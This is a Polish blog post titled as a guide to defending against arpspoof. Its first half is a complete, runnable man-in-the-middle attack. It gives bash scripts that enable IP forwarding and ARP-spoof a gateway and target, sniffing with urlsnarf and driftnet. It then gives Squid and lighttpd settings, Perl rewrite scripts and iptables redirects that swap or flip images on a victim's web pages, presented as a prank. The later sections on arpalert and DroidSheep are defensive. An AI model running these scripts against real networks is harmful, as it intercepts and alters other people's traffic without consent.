---
title: Jak bronić się przed atakiem arpspoof?
author: Przemek
type: post
date: 2013-06-28T20:09:10+00:00
url: /jak-bronic-sie-przed-atakiem-arpspoof/
featured_image: /wp-content/uploads/2013/06/techfreak_arpspoof_ico.jpg
hits:
  - 2094
dsq_thread_id:
  - 1446092104
categories:
  - Network
tags:
  - security

---
Grzebiąc w swoich linuksowych notatkach znalazłem instrukcje jak przy pomocy arpspoof, proxy i serwera www można zrobić komuś żart. Polega on na odwróceniu lub podmienieniu obrazków na wszystkich oglądanych przez ofiarę stronach www na inne np. coś śmiesznego. <!--more-->

Tak, tak, jak by nie patrzeć to jest atak <a href="http://pl.wikipedia.org/wiki/ARP_Spoofing" target="_blank">arpspoof</a> typu <a href="http://pl.wikipedia.org/wiki/Atak_man_in_the_middle" target="_blank">MITM</a> który jest naprawdę łatwy do zrealizowania. Poniżej będzie można zobaczyć jak wygląda przeprowadzenie takiego ataku w sieci LAN w praktyce i jak się przed tym bronić na komputerze i smartfonie.

### Przykład ataku arpspoof

Poniżej pokaże jak okłamać stacje ofiary i bramę w sieci aby cały ruch przechodził przez mój komputer co pozwoli podejrzeć ruch z komputera ofiary. Na początek trzeba zainstalować potrzebne pakiety takie jak **dsniff** który zawiera **arpspoof** i **urlsnarf **lub** driftnet** dzięki któremu zobaczymy obrazki jakie są wyświetlane na podsłuchiwanej stacji.

<pre>aptitude install dsniff xterm driftnet</pre>

Poniżej skrypt który ułatwi to wszystko uruchomić i obserwować. Na początek pozwalamy na przekazywanie pakietów przez nasz interfejs. Następnie definiujemy adres IP bramy w sieci i naszego celu.

<pre>#! /bin/bash
echo 1 &gt; /proc/sys/net/ipv4/ip_forward
gateway=172.18.10.254
target=172.18.10.14
xterm -e arpspoof -i wlan0 -t $gateway $target &
xterm -e arpspoof -i wlan0 -t $target $gateway &
xterm -e urlsnarf -i wlan0 &
xterm -e driftnet &</pre>

Po odpaleniu skryptu okazało się że na podsłuchiwanej stacji ktoś ogląda sobie <http://strims.pl/s/dlugieszyny/>. No i tu się zaczyna zabawa. Pierwsze co przychodzi na myśl żeby zamienić te długie nóżki na coś innego np. na prawdziwe szyny kolejowe, tak żeby było tematycznie.

[<img class="aligncenter size-full wp-image-3835" alt="Atak arpspoof" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_1.jpg" width="800" height="452" />][1]

### Zamiana

Mam cel, chce zamienić obrazki czyli pliki jpg wyświetlane w przeglądarce na coś swojego lub obrócić oryginały o 180 stopni. Aby go zrealizować muszę zainstalować serwer www **lighttpd**, serwer proxy **squid** i program, kombajn do obróbki grafiki **imagemagick**.

<pre>aptitude install squid lighttpd imagemagick</pre>

#### Konfiguracja serwera www lighttpd

Sprawdzam czy w lighttpd.conf **document.root** wskazuje na /var/www/

<pre>cat /etc/lighttpd/lighttpd.conf |grep server.document-root
<strong>server.document-root = "/var/www"</strong></pre>

Tworzę folder w /var/www **replace** i nadaje uprawniania

<pre>mkdir /var/www/replace
sudo chown www-data:www-data /var/www/replace
sudo chmod 775 /var/www/replace
sudo gpasswd -a proxy www-data</pre>

Do **/var/www/replace** wgrywam plik **szyny.jpg** i nadaje uprawniania. Każdy musi sobie znaleźć swoje szyny.jpg :)

<pre>sudo chown www-data:www-data /var/www/szyny.jpg
chmod 775 /var/www/szyny.jpg</pre>

### Konfiguracja serwera proxy squid3

Cała konfiguracja squid znajduje się w pliku **/etc/squid3/squid.conf**

Szukam linii jak poniżej i usuwam hasz

<pre># acl localnet src 10.0.0.0/8# RFC1918 possible internal network
# acl localnet src 172.16.0.0/12# RFC1918 possible internal network
# acl localnet src 192.168.0.0/16# RFC1918 possible internal network</pre>

Szukam linii **http_access deny all** i zamieniam na** http_access allow all**

Szukam linii **http_port 3128** i zamieniam na **http_port 3128 intercept** (intercept to nowy zamiennik transparent)

Dodaje linię** url\_rewrite\_program /etc/squid3/replace.pl**

To koniec konfiguracji samego squida czas na skrypty **zamieniające pliki jpg i gif**

Skrypty znalazłem na http://compexperience.blogspot.com i trochę zmodyfikowałem pod siebie.

<span style="line-height: 1.5em;">nano  </span><strong style="line-height: 1.5em;">/etc/squid3/replace.pl</strong>

<pre>#!/usr/bin/perl
$|=1;
$count = 0;
$pid = $$;
while (&lt;&gt;) {
 chomp $_;
 if ($_ =~ /(.*\.jpg)/i) {
 $url = $1;
<span style="line-height: 1.61538em;"> print "http://127.0.0.1/szyny.jpg\n";</span>
 }
 elsif ($_ =~ /(.*\.gif)/i) {
 $url = $1;
print "http://127.0.0.1/szyny.jpg\n";
}
 else {
 print "$_\n";;
 }
 $count++;
}</pre>

drugi skrypt **obracający obrazki o 180 stopni**

nano ** /etc/squid3/flip.pl**

<pre>#!/usr/bin/perl
 $|=1;
 $count = 0;
 $pid = $$;
 while (&lt;&gt;) {
 chomp $_;
 if ($_ =~ /(.*\.jpg)/i) {
 $url = $1;
 system("/usr/bin/wget", "-q", "-O","/var/www/replace/$pid-$count.jpg", "$url");
 system("/usr/bin/mogrify", "-flip","/var/www/replace/$pid-$count.jpg");
 print "http://127.0.0.1/replace/$pid-$count.jpg\n";
 }
 elsif ($_ =~ /(.*\.gif)/i) {
 $url = $1;
 system("/usr/bin/wget", "-q", "-O","/var/www/replace/$pid-$count.gif", "$url");
 system("/usr/bin/mogrify", "-flip","/var/www/replace/$pid-$count.gif");
 print "http://127.0.0.1/replace/$pid-$count.gif\n";
 }
 else {
 print "$_\n";;
 }
 $count++;
 }</pre>

Nadaje uprawnienia dla obu skryptów

<pre>chmod 755 /etc/squid3/flip.pl
chmod 755 /etc/squid3/replace.pl</pre>

Restartuje serwer www i proxy

<pre>/etc/init.d/squid3 restart
/etc/init.d/lighttpd restart</pre>

Poniższy skrypt który uruchamia wszystko za jednym razem różni się od tego pierwszego tym że pojawiły się reguły iptables. Przekierowują one ruch www do proxy które w locie obrabia obrazki i dzięki czemu uzyskam mój cel, podmianę. Dodatkowo dochodzi adres **local** który jest adresem mojej stacji na której uruchomiłem serwer www i proxy.

<pre>#! /bin/bash
 echo 1 &gt; /proc/sys/net/ipv4/ip_forward
 gw=172.18.10.254
 target=172.18.10.12
 local=172.18.10.14
 iptables -F
 iptables -t nat -F
 iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j DNAT --to-destination $local:3128
 /etc/init.d/lighttpd restart
 /etc/init.d/squid3 restart
 xterm -e arpspoof -t $gw $target &
 xterm -e arpspoof -t $target $gw &</pre>

Oto wynik :):)

[<img class="aligncenter size-full wp-image-3841" alt="techfreak_arpspoof2_1" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof2_1.jpg" width="800" height="586" />][2]

### Jak się bronić przed arpspoof ?

Ja znalazłem program **arpalert** który monitoruje stan przypisanych adresów mac do IP i do którego można podpiąć własne skrypty powiadamiające. Skonfigurowałem sobie go tak aby wyświetlał mi powiadomienie jak poniżej a do tego blokował przy pomocy iptables ruch z nowego (atakującego) mac adresu.

[<img class="aligncenter size-full wp-image-3867" alt="techfreak_arpspoof_arpalert_1" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_arpalert_1.jpg" width="800" height="600" />][3]

### Konfiguracja Arpalert

Konfiguracje arpalert przeprowadza się w pliku** /etc/arpalert/arpalert.conf** i zmieniam tam trzy sprawy, użytkownika, na root aby wyświetlać powiadomienia, interfejs na swój np wlan0. Na koniec wskazuje jaki skrypt ma wykonać jeśli wykryje zmiany.

nano /etc/arpalert/arpalert.conf

<pre>user = root
interface = wlan0
action on detect = "/etc/arpalert/alert"</pre>

nano /etc/arpalert/alert

<pre>#! /bin/bash

case $5 in
0 )
AlertType="IP change";;
1 )
AlertType="MAC address already detected but not in white list";;
2 )
AlertType="MAC address in black list";;
3 )
AlertType="New MAC address";;
4 )
AlertType="Unauthorized ARP request";;
5 )
AlertType="Abusive number of ARP request detected";;
6 )
AlertType="Ethernet MAC address different from ARP MAC address";;
7 )
AlertType="Flood detected";;
8 )
AlertType="New MAC address whithout IP address";;
9 )
AlertType="MAC change";;
* )
AlertType="unknown";;
esac

 export DISPLAY=:0
 notify-send "Arpalert!!!" "Time $(date +%d-%m-%y-%H:%M) MAC: $1 Interface: $4"
 #logowanie
 echo "$AlertType Time $(date +%d-%m-%y-%H:%M)  MAC: $1 Interface: $4" &gt;&gt; /var/log/arpalert.txt
 #blokowanie
 iptables -A INPUT -m mac --mac-source $1 -j DROP</pre>

Nadaje uprawneinia i dodaje do autostartu

<pre>chmod 755 /etc/arpalert/alert
update-rc.d arpalert defaults</pre>

### A co ze smartfonem?

Aby uchronić się przed atakiem typu arpspoof wystarczy pobrać i zainstalować program Droidsheep ze sklepu PLAY. Jak widać poniżej po zainstalowaniu programu wykrył on zmianę mac adresu bramy. Fajnie że od razu wyłącza Wifi aby zapobiec dalszemu podsłuchiwaniu.

<p style="text-align: center;">
  <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1.jpg"><img class="aligncenter  wp-image-3847" alt="techfreak_driodsheep1" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep1.jpg" width="461" height="768" /></a> <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2.jpg"><img class="aligncenter  wp-image-3848" alt="techfreak_driodsheep2" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep2.jpg" width="461" height="768" /></a> <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3.jpg"><img class="aligncenter  wp-image-3849" alt="techfreak_driodsheep3" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep3.jpg" width="461" height="768" /></a> <a href="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4.jpg"><img class="aligncenter  wp-image-3850" alt="techfreak_driodsheep4" src="http://techfreak.pl/wp-content/uploads/2013/06/techfreak_driodsheep4.jpg" width="461" height="768" /></a>
</p>

### Na co trzeba uważać

Jedynym problemem chyba na jaki możemy natrafić to że zainstalowaliśmy oprogramowania monitorujące gdy już ktoś nas podsłuchiwał. Jestem w poszukiwaniu fajnych rozwiązań ale chyba najprościej sprawdzić tablice **arp -a** i upewnić się że nie mamy tam dwóch adresów IP z tym samym adresem mac.

Może ktoś ma jakieś inne pomysły ?

 [1]: http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_1.jpg
 [2]: http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof2_1.jpg
 [3]: http://techfreak.pl/wp-content/uploads/2013/06/techfreak_arpspoof_arpalert_1.jpg